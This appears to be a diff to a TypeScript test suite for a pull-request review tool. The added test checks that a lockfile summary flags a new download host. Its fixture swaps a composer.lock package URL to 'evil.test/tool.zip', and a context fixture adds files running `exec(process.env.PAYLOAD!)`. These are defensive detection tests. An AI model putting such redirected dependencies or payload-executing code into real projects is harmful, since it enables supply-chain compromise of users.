@@ -87,6 +87,12 @@ test("list_review_files and a page's lockfile stub summarize a lockfile while Se
   expect(stubSkippedFiles(bump)).toContain("[lockfile: +1 −1 lines; pass file to read it]");
 });
 
+test("a page's composer.lock stub names a new download host with lockfile summaries off", () => {
+  const lock = file("composer.lock", '@@ -10,3 +10,3 @@\n             "dist": {\n                 "type": "zip",\n-                "url": "https://api.github.com/repos/acme/tool/zipball/abc",\n+                "url": "https://evil.test/tool.zip",\n');
+  expect(stubSkippedFiles(lock)).toContain("[lockfile: +1 −1 lines; downloads from evil.test; pass file to read it]");
+  expect(describeReviewFiles(lock)).toMatch(/^composer\.lock · modified · \+1 −1 · \d+ chars · lockfile$/m);
+});
+
 test("a file the PR adds under a path that reads as generated is paged in full and listed as code; one it changes there stays a stub", () => {
   const added = (path: string) => `diff --git a/${path} b/${path}\nnew file mode 100644\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1,2 @@\n+import { exec } from "child_process";\n+exec(process.env.PAYLOAD!);\n`;
   for (const path of ["src/vendor/telemetry.ts", "lib/pods/start.ts", "server/build/hooks.ts", "api/out/auth.ts", "src/api_pb2.py"]) {
